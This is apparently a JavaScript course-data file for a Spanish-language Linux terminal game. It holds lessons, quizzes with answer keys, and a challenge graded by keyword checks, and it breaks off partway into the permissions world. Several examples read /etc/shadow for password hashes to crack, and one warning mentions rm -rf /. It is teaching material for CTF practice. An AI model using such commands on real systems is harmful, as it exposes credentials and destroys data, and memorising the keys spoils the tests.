// HACKFORGE - CodeQuest Terminal Linux Path
// 5 Mundos, 20 niveles cada uno, desafío de código al final de cada mundo

export const TERMINAL_PATH = {
  id: "bash",
  nombre: "Terminal Linux",
  icon: "💻",
  color: "#4ade80",
  descripcion: "Domina la terminal Linux desde cero. Navegación, permisos, redes y hacking real.",
  mundos: [

    // ─────────────────────────────────────────────
    // MUNDO 1 — NAVEGACIÓN BÁSICA
    // ─────────────────────────────────────────────
    {
      id: 1,
      nombre: "Navegación Básica",
      icon: "🗺️",
      color: "#4ade80",
      descripcion: "ls, cd, pwd, mkdir, rm, cp, mv. Muévete por el sistema de archivos.",
      bloqueado: false,
      niveles: [
        {
          id: "bash-1-1",
          titulo: "¿Qué es la terminal?",
          teoria: "La terminal (también llamada consola, shell o CLI) es una interfaz de texto donde le das instrucciones al sistema operativo escribiendo comandos.\n\nEn Linux, la terminal más usada es Bash (Bourne Again SHell). Cuando ves el símbolo $ estás como usuario normal. Cuando ves # estás como root (administrador).\n\nLa terminal es la herramienta más poderosa de Linux — desde aquí puedes controlar absolutamente todo el sistema.",
          ejemplo: {
            codigo: "# El prompt te muestra información útil:\nwaldo@kali:~$\n#       ^       ^  ^\n# usuario  máquina  directorio actual\n\n# ~ significa tu carpeta personal (/home/waldo)\n# $ significa usuario normal\n# # significa root (administrador)",
            output: "waldo@kali:~$"
          },
          pregunta: "¿Qué símbolo indica que estás trabajando como usuario ROOT en la terminal?",
          opciones: ["$", ">", "#", "@"],
          correcta: 2,
          explicacion: "El símbolo # indica que estás como root (administrador del sistema). El $ indica usuario normal. En CTFs y pentesting muchas veces el objetivo es 'escalar privilegios' para llegar a #."
        },
        {
          id: "bash-1-2",
          titulo: "pwd — ¿Dónde estoy?",
          teoria: "pwd (Print Working Directory) te dice en qué carpeta estás actualmente.\n\nEn Linux todo es una ruta. La raíz del sistema es / y desde ahí se construye todo el árbol de directorios:\n\n• / → raíz del sistema\n• /home → carpetas de usuarios\n• /root → carpeta del usuario root\n• /etc → archivos de configuración\n• /var → logs y datos variables\n• /tmp → archivos temporales",
          ejemplo: {
            codigo: "$ pwd\n/home/waldo\n\n$ pwd\n/etc\n\n$ pwd\n/var/log",
            output: "/home/waldo\n/etc\n/var/log"
          },
          pregunta: "¿Qué comando muestra el directorio actual en el que te encuentras?",
          opciones: ["dir", "where", "pwd", "location"],
          correcta: 2,
          explicacion: "pwd (Print Working Directory) imprime la ruta completa del directorio donde estás. Es lo primero que debes ejecutar cuando no sabes dónde estás en el sistema."
        },
        {
          id: "bash-1-3",
          titulo: "ls — Listar archivos",
          teoria: "ls (list) muestra el contenido de un directorio.\n\nOpciones más usadas:\n• ls → lista básica\n• ls -l → lista detallada (permisos, tamaño, fecha)\n• ls -a → muestra archivos ocultos (empiezan con .)\n• ls -la → combinación de ambas\n• ls -lh → tamaños legibles (KB, MB)\n• ls /ruta → lista otro directorio",
          ejemplo: {
            codigo: "$ ls\nDesktop  Documents  Downloads  flag.txt\n\n$ ls -la\ntotal 32\ndrwxr-xr-x  5 waldo waldo 4096 Jun  1 10:00 .\ndrwxr-xr-x 15 waldo waldo 4096 Jun  1 09:00 ..\n-rw-r--r--  1 waldo waldo  220 Jun  1 09:00 .bash_history\ndrwxr-xr-x  2 waldo waldo 4096 Jun  1 10:00 Desktop\n-rw-r--r--  1 waldo waldo   25 Jun  1 10:00 flag.txt",
            output: "Desktop  Documents  Downloads  flag.txt"
          },
          pregunta: "¿Qué opción de ls muestra los archivos OCULTOS?",
          opciones: ["-l", "-h", "-a", "-r"],
          correcta: 2,
          explicacion: "ls -a muestra todos los archivos incluyendo los ocultos (los que empiezan con punto, como .bash_history, .ssh, .bashrc). En CTFs muchas veces las flags están en archivos ocultos."
        },
        {
          id: "bash-1-4",
          titulo: "cd — Cambiar directorio",
          teoria: "cd (Change Directory) te mueve a otra carpeta.\n\nRutas importantes:\n• cd /ruta/absoluta → va desde la raíz\n• cd carpeta → va a una carpeta relativa\n• cd .. → sube un nivel\n• cd ../.. → sube dos niveles\n• cd ~ → va a tu home\n• cd - → vuelve al directorio anterior\n• cd / → va a la raíz del sistema",
          ejemplo: {
            codigo: "$ pwd\n/home/waldo\n\n$ cd Documents\n$ pwd\n/home/waldo/Documents\n\n$ cd ..\n$ pwd\n/home/waldo\n\n$ cd /etc\n$ pwd\n/etc\n\n$ cd ~\n$ pwd\n/home/waldo",
            output: "/home/waldo\n/home/waldo/Documents\n/home/waldo\n/etc\n/home/waldo"
          },
          pregunta: "¿Qué hace el comando cd ..?",
          opciones: [
            "Va a la carpeta raíz /",
            "Sube un nivel en el árbol de directorios",
            "Va a la carpeta home del usuario",
            "Vuelve al directorio anterior"
          ],
          correcta: 1,
          explicacion: "cd .. sube un nivel en el árbol de directorios. Si estás en /home/waldo/Documents, cd .. te lleva a /home/waldo. Puedes encadenar: cd ../.. sube dos niveles."
        },
        {
          id: "bash-1-5",
          titulo: "mkdir — Crear directorios",
          teoria: "mkdir (Make Directory) crea nuevas carpetas.\n\nOpciones útiles:\n• mkdir nombre → crea una carpeta\n• mkdir -p ruta/completa → crea toda la ruta aunque no exista\n• mkdir carpeta1 carpeta2 → crea varias a la vez\n\nEn CTFs y pentesting usarás mkdir para organizar tus resultados de escaneos, exploits y evidencias.",
          ejemplo: {
            codigo: "$ mkdir mis_herramientas\n$ ls\nmis_herramientas\n\n$ mkdir -p proyectos/hackforge/src\n$ ls proyectos/hackforge/\nsrc\n\n$ mkdir recon loot exploits\n$ ls\nexploits  loot  mis_herramientas  proyectos  recon",
            output: "mis_herramientas\nsrc\nexploits  loot  mis_herramientas  proyectos  recon"
          },
          pregunta: "¿Qué opción de mkdir crea directorios intermedios que no existen?",
          opciones: ["-r", "-f", "-p", "-v"],
          correcta: 2,
          explicacion: "mkdir -p crea toda la cadena de directorios. Sin -p, si /proyectos no existe, mkdir proyectos/hackforge daría error. Con -p crea /proyectos y dentro /hackforge automáticamente."
        },
        {
          id: "bash-1-6",
          titulo: "touch y cat — Crear y ver archivos",
          teoria: "touch crea un archivo vacío o actualiza su fecha.\ncat (concatenate) muestra el contenido de un archivo.\n\n• touch archivo.txt → crea archivo vacío\n• cat archivo.txt → muestra contenido\n• cat -n archivo.txt → muestra con números de línea\n• cat archivo1 archivo2 → muestra ambos\n\nEn CTFs: cat flag.txt es el comando más usado para leer la flag.",
          ejemplo: {
            codigo: "$ touch notas.txt\n$ ls\nnotas.txt\n\n$ cat /etc/hostname\nkali\n\n$ cat flag.txt\nTHM{w3lc0m3_t0_l1nux}\n\n$ cat -n /etc/hosts\n     1  127.0.0.1   localhost\n     2  127.0.1.1   kali",
            output: "notas.txt\nkali\nTHM{w3lc0m3_t0_l1nux}\n     1  127.0.0.1   localhost\n     2  127.0.1.1   kali"
          },
          pregunta: "En un CTF encuentras un archivo llamado flag.txt. ¿Qué comando usas para leerlo?",
          opciones: ["open flag.txt", "read flag.txt", "cat flag.txt", "show flag.txt"],
          correcta: 2,
          explicacion: "cat flag.txt muestra el contenido del archivo en la terminal. Es el comando más usado en CTFs para leer flags. También puedes usar less para archivos grandes o head/tail para ver el inicio/final."
        },
        {
          id: "bash-1-7",
          titulo: "cp — Copiar archivos",
          teoria: "cp (copy) copia archivos y directorios.\n\nUso:\n• cp origen destino → copia un archivo\n• cp archivo /ruta/ → copia a otro directorio\n• cp -r directorio/ destino/ → copia directorio completo\n• cp -v origen destino → modo verbose (muestra lo que hace)\n\nImportante: si el archivo destino ya existe, lo sobreescribe sin preguntar.",
          ejemplo: {
            codigo: "$ cp flag.txt flag_backup.txt\n$ ls\nflag.txt  flag_backup.txt\n\n$ cp flag.txt /tmp/\n$ ls /tmp/\nflag.txt\n\n$ cp -r mis_herramientas/ backup_herramientas/\n$ ls\nbackup_herramientas  mis_herramientas",
            output: "flag.txt  flag_backup.txt\nflag.txt\nbackup_herramientas  mis_herramientas"
          },
          pregunta: "¿Qué opción necesitas para copiar un directorio completo con cp?",
          opciones: ["-a", "-f", "-r", "-d"],
          correcta: 2,
          explicacion: "cp -r (recursive) copia un directorio y todo su contenido. Sin -r, cp falla al intentar copiar directorios. La -r es necesaria para cualquier copia que incluya subcarpetas."
        },
        {
          id: "bash-1-8",
          titulo: "mv — Mover y renombrar",
          teoria: "mv (move) mueve archivos o los renombra. Es el mismo comando para ambas operaciones.\n\nUso:\n• mv archivo nuevo_nombre → renombra\n• mv archivo /ruta/ → mueve\n• mv archivo /ruta/nuevo_nombre → mueve y renombra\n• mv -i origen destino → pregunta antes de sobreescribir",
          ejemplo: {
            codigo: "$ ls\nresultados_viejos.txt  notas.txt\n\n# Renombrar:\n$ mv resultados_viejos.txt resultados_nmap.txt\n$ ls\nnotas.txt  resultados_nmap.txt\n\n# Mover:\n$ mv resultados_nmap.txt /tmp/\n$ ls /tmp/\nresultados_nmap.txt",
            output: "notas.txt  resultados_nmap.txt\nresultados_nmap.txt"
          },
          pregunta: "¿Cuál de estos comandos renombra 'viejo.txt' a 'nuevo.txt'?",
          opciones: [
            "rename viejo.txt nuevo.txt",
            "mv viejo.txt nuevo.txt",
            "cp viejo.txt nuevo.txt",
            "rn viejo.txt nuevo.txt"
          ],
          correcta: 1,
          explicacion: "mv viejo.txt nuevo.txt renombra el archivo. mv es 'mover' pero cuando el destino está en el mismo directorio con distinto nombre, el efecto es renombrar. No crea copia — el archivo original desaparece."
        },
        {
          id: "bash-1-9",
          titulo: "rm — Eliminar archivos",
          teoria: "rm (remove) elimina archivos y directorios.\n\n⚠️ CUIDADO: En Linux no hay papelera de reciclaje. rm es permanente.\n\nUso:\n• rm archivo → elimina un archivo\n• rm -r directorio → elimina directorio y contenido\n• rm -f archivo → fuerza la eliminación sin preguntar\n• rm -rf directorio → elimina todo sin preguntar\n• rm -i archivo → pregunta antes de eliminar",
          ejemplo: {
            codigo: "$ ls\narchivo1.txt  archivo2.txt  carpeta_temp/\n\n$ rm archivo1.txt\n$ ls\narchivo2.txt  carpeta_temp/\n\n$ rm -r carpeta_temp/\n$ ls\narchivo2.txt\n\n# ⚠️ NUNCA hagas esto en producción:\n# rm -rf /  (eliminaría TODO el sistema)",
            output: "archivo2.txt  carpeta_temp/\narchivo2.txt\narchivo2.txt"
          },
          pregunta: "¿Qué hace rm -rf directorio/?",
          opciones: [
            "Mueve el directorio a la papelera",
            "Elimina el directorio pidiendo confirmación",
            "Elimina el directorio y todo su contenido sin preguntar",
            "Renombra el directorio"
          ],
          correcta: 2,
          explicacion: "rm -rf elimina recursivamente (-r) y forzado (-f) sin pedir confirmación. Es el comando más peligroso de Linux — rm -rf / eliminaría todo el sistema. Úsalo siempre con cuidado y doble verificación."
        },
        {
          id: "bash-1-10",
          titulo: "Rutas absolutas vs relativas",
          teoria: "Hay dos formas de especificar una ruta en Linux:\n\n• Ruta absoluta: empieza con / → /home/waldo/flag.txt\n• Ruta relativa: desde donde estás → ./flag.txt o simplemente flag.txt\n\nSímbolos especiales:\n• . → directorio actual\n• .. → directorio padre\n• ~ → home del usuario\n• / → raíz del sistema",
          ejemplo: {
            codigo: "# Si estás en /home/waldo:\n$ cat flag.txt          # relativa\n$ cat ./flag.txt        # relativa con punto\n$ cat /home/waldo/flag.txt  # absoluta\n# Los tres hacen lo mismo\n\n# Navegar con rutas relativas:\n$ cd ../../etc          # sube 2 niveles, entra a etc\n$ pwd\n/etc",
            output: "THM{r3l4t1v3_p4th}\nTHM{r3l4t1v3_p4th}\nTHM{r3l4t1v3_p4th}\n/etc"
          },
          pregunta: "¿Cuál de estas es una ruta ABSOLUTA?",
          opciones: ["./archivo.txt", "../carpeta/", "~/Documents", "/etc/passwd"],
          correcta: 3,
          explicacion: "/etc/passwd es una ruta absoluta porque empieza con /. Las rutas absolutas siempre empiezan desde la raíz del sistema. ~ es un alias especial pero no es estrictamente absoluta (se expande a /home/usuario)."
        },
        {
          id: "bash-1-11",
          titulo: "echo — Imprimir texto",
          teoria: "echo imprime texto en la terminal. También se usa para escribir en archivos y ver variables de entorno.\n\nUso:\n• echo 'texto' → imprime texto\n• echo $VARIABLE → muestra valor de variable\n• echo 'texto' > archivo → escribe en archivo (sobreescribe)\n• echo 'texto' >> archivo → añade al final del archivo\n• echo $PATH → muestra los directorios del sistema",
          ejemplo: {
            codigo: "$ echo 'Hola HACKFORGE'\nHola HACKFORGE\n\n$ echo $USER\nwaldo\n\n$ echo $HOME\n/home/waldo\n\n# Escribir en archivo:\n$ echo 'mi nota' > notas.txt\n$ cat notas.txt\nmi nota\n\n# Añadir (no sobreescribir):\n$ echo 'otra nota' >> notas.txt\n$ cat notas.txt\nmi nota\notra nota",
            output: "Hola HACKFORGE\nwaldo\n/home/waldo\nmi nota\nmi nota\notra nota"
          },
          pregunta: "¿Qué diferencia hay entre > y >> en echo?",
          opciones: [
            "> crea el archivo, >> lo elimina",
            "> sobreescribe el archivo, >> añade al final",
            "> añade al final, >> sobreescribe",
            "Son iguales"
          ],
          correcta: 1,
          explicacion: "> redirige y sobreescribe — si el archivo existe, borra su contenido y escribe el nuevo. >> añade al final sin borrar lo existente. Este concepto de redirección es fundamental en Linux."
        },
        {
          id: "bash-1-12",
          titulo: "man y --help — La ayuda",
          teoria: "En Linux nunca estás solo — cada comando tiene documentación integrada.\n\n• man comando → manual completo (presiona q para salir)\n• comando --help → ayuda resumida\n• comando -h → versión corta de ayuda\n• whatis comando → descripción en una línea\n• apropos palabra → busca comandos relacionados\n\nEn exámenes como OSCP, el uso de man es completamente válido.",
          ejemplo: {
            codigo: "$ man ls\n# Abre el manual completo de ls\n# Navega con flechas, busca con /término, sal con q\n\n$ ls --help\nUsage: ls [OPTION]... [FILE]...\nList information about the FILEs\n  -a  do not ignore entries starting with .\n  -l  use a long listing format\n  ...\n\n$ whatis pwd\npwd (1) - print name of current/working directory",
            output: "Usage: ls [OPTION]... [FILE]...\nList information about the FILEs\n  -a  do not ignore entries starting with .\n  -l  use a long listing format"
          },
          pregunta: "¿Qué comando abre el manual completo de nmap?",
          opciones: ["help nmap", "nmap --manual", "man nmap", "nmap -info"],
          correcta: 2,
          explicacion: "man nmap abre el manual completo (manpage) de nmap. Es una referencia esencial. Dentro del manual: flechas para navegar, /término para buscar, n para siguiente resultado, q para salir."
        },
        {
          id: "bash-1-13",
          titulo: "Variables de entorno",
          teoria: "Las variables de entorno son variables globales del sistema que guardan configuración importante.\n\nVariables comunes:\n• $HOME → tu directorio personal\n• $USER → tu nombre de usuario\n• $PATH → directorios donde Linux busca comandos\n• $SHELL → tu shell actual\n• $PWD → directorio actual\n• $HOSTNAME → nombre de la máquina",
          ejemplo: {
            codigo: "$ echo $HOME\n/home/waldo\n\n$ echo $USER\nwaldo\n\n$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\n$ echo $SHELL\n/bin/bash\n\n# Ver TODAS las variables:\n$ env\nHOME=/home/waldo\nUSER=waldo\nSHELL=/bin/bash\n...",
            output: "/home/waldo\nwaldo\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n/bin/bash"
          },
          pregunta: "¿Qué variable de entorno contiene los directorios donde Linux busca los ejecutables?",
          opciones: ["$HOME", "$SHELL", "$PATH", "$USER"],
          correcta: 2,
          explicacion: "$PATH contiene los directorios separados por : donde el sistema busca los comandos. Cuando escribes 'nmap', Linux busca el ejecutable en cada directorio de $PATH. En pentesting es importante saber modificar $PATH."
        },
        {
          id: "bash-1-14",
          titulo: "history — Historial de comandos",
          teoria: "history guarda todos los comandos que has ejecutado. Muy útil para recordar qué hiciste.\n\nUso:\n• history → muestra todo el historial\n• history 20 → muestra los últimos 20\n• !! → repite el último comando\n• !n → repite el comando número n\n• Ctrl+R → búsqueda inversa en historial\n• history -c → limpia el historial",
          ejemplo: {
            codigo: "$ history 5\n  156  nmap -sV 10.10.10.1\n  157  cd /var/log\n  158  cat auth.log\n  159  grep 'Failed' auth.log\n  160  history 5\n\n# Repetir comando 156:\n$ !156\nnmap -sV 10.10.10.1\n\n# Repetir el último:\n$ !!\nnmap -sV 10.10.10.1",
            output: "  156  nmap -sV 10.10.10.1\n  157  cd /var/log\n  158  cat auth.log\n  159  grep 'Failed' auth.log\n  160  history 5"
          },
          pregunta: "¿Qué atajo de teclado abre la búsqueda inversa en el historial de Bash?",
          opciones: ["Ctrl+H", "Ctrl+R", "Ctrl+F", "Ctrl+B"],
          correcta: 1,
          explicacion: "Ctrl+R abre la búsqueda inversa — escribe parte del comando y Bash busca en el historial. Presiona Ctrl+R varias veces para ver más resultados. Es el atajo más útil para no reescribir comandos largos."
        },
        {
          id: "bash-1-15",
          titulo: "Autocompletado con Tab",
          titulo_corto: "Tab",
          teoria: "La tecla Tab es tu mejor amiga en la terminal. Autocompleta comandos, rutas y nombres de archivos.\n\n• Tab una vez → completa si hay una sola opción\n• Tab dos veces → muestra todas las opciones disponibles\n• Funciona con: comandos, rutas, nombres de archivos, opciones\n\nAhorra tiempo y evita errores de escritura.",
          ejemplo: {
            codigo: "# Escribes 'cat /etc/pa' y presionas Tab:\n$ cat /etc/pa[TAB]\n$ cat /etc/passwd\n# Se autocompletó!\n\n# Si hay varias opciones, Tab Tab las muestra:\n$ cat /etc/p[TAB][TAB]\npasswd   passwd-  pam.conf  pam.d/\n\n# También con comandos:\n$ nm[TAB]\nnm  nmap  nmcli  nmtui",
            output: "passwd   passwd-  pam.conf  pam.d/\nnm  nmap  nmcli  nmtui"
          },
          pregunta: "¿Qué hace presionar Tab dos veces cuando hay múltiples opciones disponibles?",
          opciones: [
            "Selecciona la primera opción",
            "Muestra todas las opciones disponibles",
            "Cancela el autocompletado",
            "Abre el manual del comando"
          ],
          correcta: 1,
          explicacion: "Tab Tab (doble Tab) muestra todas las opciones disponibles para el autocompletado. Es esencial para explorar el sistema — por ejemplo, escribir /etc/ y presionar Tab Tab muestra todos los archivos de /etc."
        },
        {
          id: "bash-1-16",
          titulo: "Wildcards — Comodines",
          teoria: "Los wildcards (comodines) permiten seleccionar múltiples archivos con patrones.\n\n• * → cualquier cantidad de caracteres\n• ? → exactamente un carácter\n• [abc] → uno de los caracteres listados\n• [a-z] → rango de caracteres\n\nEjemplo: *.txt selecciona todos los archivos .txt",
          ejemplo: {
            codigo: "$ ls\nflag.txt  notas.txt  imagen.png  script.py  backup.txt\n\n# Todos los .txt:\n$ ls *.txt\nflag.txt  notas.txt  backup.txt\n\n# Archivos que empiezan con 'f':\n$ ls f*\nflag.txt\n\n# Eliminar todos los backups:\n$ rm backup*.txt\n\n# Un solo carácter:\n$ ls flag.??t\nflag.txt",
            output: "flag.txt  notas.txt  backup.txt\nflag.txt"
          },
          pregunta: "¿Qué comando lista SOLO los archivos con extensión .log?",
          opciones: ["ls log", "ls .log", "ls *.log", "ls -log"],
          correcta: 2,
          explicacion: "ls *.log usa el wildcard * que representa cualquier cantidad de caracteres. *.log selecciona todo archivo que termine en .log. En CTFs y análisis forense esto es útil para filtrar tipos de archivos específicos."
        },
        {
          id: "bash-1-17",
          titulo: "head y tail — Ver partes de archivos",
          teoria: "Para archivos grandes, no siempre necesitas verlos completos.\n\n• head archivo → muestra las primeras 10 líneas\n• head -n 20 archivo → muestra las primeras 20 líneas\n• tail archivo → muestra las últimas 10 líneas\n• tail -n 20 archivo → muestra las últimas 20 líneas\n• tail -f archivo → sigue el archivo en tiempo real (útil para logs)\n\nEn CTFs: tail -f /var/log/auth.log monitorea accesos en tiempo real.",
          ejemplo: {
            codigo: "$ head -n 3 /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n\n$ tail -n 2 /etc/passwd\nwaldo:x:1000:1000::/home/waldo:/bin/bash\npostgres:x:117:125::/var/lib/postgresql:/bin/bash\n\n# Monitorear logs en tiempo real:\n$ tail -f /var/log/syslog",
            output: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nwaldo:x:1000:1000::/home/waldo:/bin/bash\npostgres:x:117:125::/var/lib/postgresql:/bin/bash"
          },
          pregunta: "¿Qué comando monitorea un archivo de log en TIEMPO REAL?",
          opciones: ["head -f archivo", "tail -f archivo", "cat -f archivo", "watch archivo"],
          correcta: 1,
          explicacion: "tail -f (follow) sigue el archivo y muestra nuevas líneas a medida que se agregan. Es esencial para monitorear logs como /var/log/auth.log, /var/log/apache2/access.log en tiempo real durante un pentest."
        },
        {
          id: "bash-1-18",
          titulo: "Estructura del sistema Linux",
          teoria: "El sistema de archivos Linux tiene una estructura estándar. Como pentester DEBES conocerla:\n\n• / → raíz\n• /etc → configuraciones (passwd, shadow, hosts)\n• /home → usuarios\n• /root → home del root\n• /var/log → logs del sistema\n• /tmp → temporal (escribible por todos)\n• /usr/bin → ejecutables de usuario\n• /bin → ejecutables básicos\n• /proc → información del kernel en tiempo real\n• /dev → dispositivos",
          ejemplo: {
            codigo: "# Archivos críticos que un pentester busca:\n$ cat /etc/passwd       # usuarios del sistema\n$ cat /etc/shadow       # hashes de contraseñas (solo root)\n$ cat /etc/hosts        # resolución DNS local\n$ ls /home              # qué usuarios existen\n$ cat /root/flag.txt    # flag de root (si eres root)\n$ ls /tmp               # archivos temporales\n$ cat /proc/version     # versión del kernel",
            output: "root:x:0:0:root:/root:/bin/bash\nwaldo:x:1000:1000::/home/waldo:/bin/bash\n127.0.0.1 localhost\nwaldo\nTHM{r00t_fl4g_here}\nLinux version 5.10.0-kali3-amd64"
          },
          pregunta: "¿En qué archivo de Linux se encuentran los hashes de las contraseñas de los usuarios?",
          opciones: ["/etc/passwd", "/etc/shadow", "/etc/users", "/var/passwords"],
          correcta: 1,
          explicacion: "/etc/shadow contiene los hashes de las contraseñas. Solo root puede leerlo. /etc/passwd contiene info de usuarios pero sin contraseñas reales (solo 'x'). En CTFs obtener /etc/shadow es un objetivo común para crackear hashes con hashcat o john."
        },
        {
          id: "bash-1-19",
          titulo: "Atajos de teclado en Bash",
          teoria: "Los atajos de teclado hacen la terminal mucho más rápida:\n\n• Ctrl+C → cancela el comando actual\n• Ctrl+Z → suspende el proceso\n• Ctrl+D → cierra la sesión (logout)\n• Ctrl+L → limpia la pantalla (igual que clear)\n• Ctrl+A → va al inicio de la línea\n• Ctrl+E → va al final de la línea\n• Ctrl+U → borra toda la línea\n• Ctrl+W → borra la última palabra",
          ejemplo: {
            codigo: "# Cancelar un proceso que no termina:\n$ ping 8.8.8.8\nPING 8.8.8.8 ...\n^C  ← Ctrl+C para parar\n\n# Limpiar pantalla:\n$ clear  # o Ctrl+L\n\n# Suspender y traer de vuelta:\n$ sleep 100\n^Z  ← Ctrl+Z suspende\n[1]+  Stopped    sleep 100\n$ fg  # trae de vuelta al frente",
            output: "PING 8.8.8.8 ...\n^C\n[1]+  Stopped    sleep 100"
          },
          pregunta: "¿Qué atajo de teclado cancela un proceso que está corriendo en la terminal?",
          opciones: ["Ctrl+Z", "Ctrl+D", "Ctrl+C", "Ctrl+X"],
          correcta: 2,
          explicacion: "Ctrl+C envía la señal SIGINT al proceso, cancelándolo. Ctrl+Z lo suspende (pausa) sin terminarlo. En pentesting usarás Ctrl+C constantemente para detener escaneos, listeners y otros procesos."
        },
        {
          id: "bash-1-20",
          titulo: "Resumen Mundo 1",
          teoria: "¡Mundo 1 completado! Ahora conoces los fundamentos de la terminal Linux.\n\n✅ pwd — saber dónde estás\n✅ ls — listar archivos y directorios\n✅ cd — navegar el sistema\n✅ mkdir — crear directorios\n✅ touch/cat — crear y leer archivos\n✅ cp/mv/rm — copiar, mover, eliminar\n✅ echo — imprimir y redirigir\n✅ man/--help — obtener ayuda\n✅ history — revisar comandos anteriores\n✅ Tab — autocompletar\n✅ Wildcards — seleccionar múltiples archivos\n\nEl desafío final pondrá a prueba todo esto.",
          ejemplo: {
            codigo: "# Flujo típico al entrar a una máquina CTF:\n$ pwd\n/home/waldo\n$ ls -la\n$ cd /\n$ ls\n$ cat /etc/passwd\n$ ls /home\n$ find / -name 'flag.txt' 2>/dev/null\n/home/waldo/flag.txt\n/root/flag.txt\n$ cat /home/waldo/flag.txt\nTHM{n4v3g4c10n_c0mpl3t4}",
            output: "/home/waldo\nTHM{n4v3g4c10n_c0mpl3t4}"
          },
          pregunta: "Al entrar a una nueva máquina Linux en un CTF, ¿cuál es el primer comando que deberías ejecutar?",
          opciones: ["nmap", "pwd", "ls -la", "cat /etc/passwd"],
          correcta: 1,
          explicacion: "pwd te dice exactamente dónde estás en el sistema. Es el punto de partida — necesitas orientarte antes de explorar. Luego ls -la para ver el contenido, y después explorar el sistema metódicamente."
        }
      ],
      desafio: {
        titulo: "Desafío Final — Explorador del Sistema",
        descripcion: "Escribe una secuencia de comandos que explore el sistema, cree una estructura de directorios organizada para un CTF y encuentre información del sistema.",
        instrucciones: [
          "Crea un directorio llamado 'ctf_workspace' en el directorio actual",
          "Dentro de ctf_workspace, crea tres subdirectorios: 'recon', 'loot' y 'exploits'",
          "Usa echo para crear un archivo 'notas.txt' en recon con el texto 'Inicio del CTF'",
          "Muestra el contenido de notas.txt con cat",
          "Lista el contenido de ctf_workspace con ls -la",
          "Muestra la ruta completa donde están los archivos con pwd"
        ],
        solucion: `mkdir ctf_workspace
mkdir ctf_workspace/recon ctf_workspace/loot ctf_workspace/exploits
echo 'Inicio del CTF' > ctf_workspace/recon/notas.txt
cat ctf_workspace/recon/notas.txt
ls -la ctf_workspace/
pwd`,
        test: (codigo) => {
          return codigo.includes("mkdir") &&
                 (codigo.includes("recon") || codigo.includes("loot") || codigo.includes("exploits")) &&
                 codigo.includes("echo") &&
                 codigo.includes("cat") &&
                 codigo.includes("ls") &&
                 codigo.includes("pwd");
        }
      }
    },

    // ─────────────────────────────────────────────
    // MUNDO 2 — ARCHIVOS Y PERMISOS
    // ─────────────────────────────────────────────
    {
      id: 2,
      nombre: "Archivos y Permisos",
      icon: "🔐",
      color: "#f59e0b",
      descripcion: "cat, less, chmod, chown, find, file. Controla quién accede a qué.",
      bloqueado: false,
      niveles: [
        {
          id: "bash-2-1",
          titulo: "Entendiendo los permisos",
          teoria: "En Linux cada archivo tiene permisos para tres tipos de usuarios:\n\n• Owner (dueño) → el usuario que creó el archivo\n• Group (grupo) → usuarios del mismo grupo\n• Others (otros) → todos los demás\n\nCada uno tiene tres permisos posibles:\n• r (read) = 4 → leer\n• w (write) = 2 → escribir/modificar\n• x (execute) = 1 → ejecutar\n\nEn ls -l verás algo como: -rwxr-xr-- (10 caracteres)",
          ejemplo: {
            codigo: "$ ls -l\n-rwxr-xr-- 1 waldo hackers 1024 Jun 1 script.sh\n#|\\ / \\ / \\ /\n#tipo owner group others\n#\n# - = archivo regular\n# d = directorio\n# l = enlace simbólico\n#\n# rwx = lectura+escritura+ejecución (owner)\n# r-x = lectura+ejecución (group)\n# r-- = solo lectura (others)",
            output: "-rwxr-xr-- 1 waldo hackers 1024 Jun 1 script.sh"
          },
          pregunta: "En los permisos '-rwxr-xr--', ¿qué permisos tiene el GRUPO?",
          opciones: ["rwx (lectura, escritura, ejecución)", "r-- (solo lectura)", "r-x (lectura y ejecución)", "--- (ninguno)"],
          correcta: 2,
          explicacion: "Los 10 caracteres se dividen: tipo(1) + owner(3) + group(3) + others(3). En '-rwxr-xr--': tipo=-, owner=rwx, group=r-x, others=r--. El grupo tiene r-x: puede leer y ejecutar pero NO escribir."
        },
        {
          id: "bash-2-2",
          titulo: "chmod — Cambiar permisos",
          teoria: "chmod (change mode) cambia los permisos de un archivo.\n\nHay dos formas:\n\n1. Octal (numérica):\n• r=4, w=2, x=1 → sumas para cada grupo\n• 755 = rwxr-xr-x\n• 644 = rw-r--r--\n• 777 = rwxrwxrwx (todos pueden todo)\n• 600 = rw------- (solo el dueño)\n\n2. Simbólica:\n• chmod u+x script → añade ejecución al owner\n• chmod o-r archivo → quita lectura a others\n• chmod a+x script → añade ejecución a todos",
          ejemplo: {
            codigo: "# Dar permisos de ejecución:\n$ chmod +x exploit.py\n$ ls -l exploit.py\n-rwxr-xr-x 1 waldo waldo exploit.py\n\n# Modo octal:\n$ chmod 755 script.sh   # rwxr-xr-x\n$ chmod 644 config.txt  # rw-r--r--\n$ chmod 600 id_rsa      # rw------- (clave SSH privada)\n\n# Solo el dueño puede leer y ejecutar:\n$ chmod 700 mi_script.sh",
            output: "-rwxr-xr-x 1 waldo waldo exploit.py"
          },
          pregunta: "¿Qué permisos otorga chmod 777?",
          opciones: [
            "Solo el dueño puede hacer todo",
            "Solo lectura para todos",
            "Lectura, escritura y ejecución para todos",
            "Ningún permiso para nadie"
          ],
          correcta: 2,
          explicacion: "777 = 4+2+1 para owner, group y others = rwxrwxrwx. Todos pueden leer, escribir y ejecutar. En seguridad, 777 es peligroso porque cualquier usuario puede modificar el archivo. Busca archivos con 777 en CTFs de privilege escalation."
        },
        {
          id: "bash-2-3",
          titulo: "chown — Cambiar dueño",
          teoria: "chown (change owner) cambia el propietario y/o grupo de un archivo.\n\nUso:\n• chown usuario archivo → cambia el dueño\n• chown usuario:grupo archivo → cambia dueño y grupo\n• chown :grupo archivo → cambia solo el grupo\n• chown -R usuario directorio → cambia recursivamente\n\nNormalmente solo root puede cambiar el dueño de archivos.",
          ejemplo: {
